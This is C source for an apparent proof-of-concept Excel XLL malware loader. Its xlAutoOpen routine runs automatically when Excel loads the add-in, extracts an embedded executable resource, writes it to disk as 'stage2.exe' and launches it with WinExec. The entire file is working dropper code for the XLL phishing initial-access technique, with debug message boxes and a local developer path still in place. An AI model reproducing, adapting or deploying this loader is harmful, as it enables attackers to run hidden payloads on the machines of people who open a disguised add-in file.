// Compile with: cl.exe notepadXLL.c /LD /o notepad.xll
#include "pch.h"

__declspec(dllexport) void __cdecl xlAutoOpen(void);

void __cdecl xlAutoOpen() {
	// Triggers when Excel opens

	HMODULE hFile;
	HRSRC hResource;
	DWORD dwSizeOfResource = 0;
	HGLOBAL hgResource;
	LPVOID lpResource = NULL;
	LPVOID lpBuffer = NULL;
	DWORD numBytesWritten = 0;

	HANDLE stage2Handle = NULL;
	const char* stage2Path = "C:\\Users\\chuon\\source\\repos\\XLLLoader\\x64\\Release\\stage2.exe";
	char debug[100];

	hFile = GetModuleHandleA("XLLLoader.xll");

	if (!hFile) {
		goto FINAL;
	}

	hResource = FindResourceA(
		hFile,
		MAKEINTRESOURCEA(100),
		"EXE"
	);
	if (!hResource) {
		sprintf_s(debug, "FindResourceA fails 0x%x", GetLastError());
		MessageBoxA(NULL, debug, "DEBUG", MB_ICONASTERISK);
		goto FINAL;
	}

	dwSizeOfResource = SizeofResource(hFile, hResource);
	if (dwSizeOfResource == 0) {
		sprintf_s(debug, "SizeofResource fails 0x%x", GetLastError());
		MessageBoxA(NULL, debug, "DEBUG", MB_ICONASTERISK);
		goto FINAL;
	}
	hgResource = LoadResource(
		hFile,
		hResource
	);

	if (!hgResource) {
		sprintf_s(debug, "LoadResource fails 0x%x", GetLastError());
		MessageBoxA(NULL, debug, "DEBUG", MB_ICONASTERISK);
		goto FINAL;
	}
	lpResource = LockResource(hgResource);

	if (!lpResource) {
		sprintf_s(debug, "LockResource fails 0x%x", GetLastError());
		MessageBoxA(NULL, debug, "DEBUG", MB_ICONASTERISK);
		goto FINAL;
	}

	lpBuffer = VirtualAlloc(
		NULL,
		dwSizeOfResource,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_READWRITE
	);
	if (!lpBuffer) {
		printf("VirtualAlloc fails\n");
		goto FINAL;
	}

	memcpy(lpBuffer, lpResource, dwSizeOfResource);

	stage2Handle = CreateFileA(stage2Path, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);

	if (!stage2Handle) {
		goto FINAL;
	}

	WriteFile(stage2Handle, lpBuffer, dwSizeOfResource, &numBytesWritten, NULL);

	WinExec(stage2Path, SW_SHOWNORMAL);

FINAL:
	if (lpBuffer) {
		VirtualFree(lpBuffer, dwSizeOfResource,  MEM_RELEASE);
	}

	if (stage2Handle) {
		CloseHandle(stage2Handle);
	}
}

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}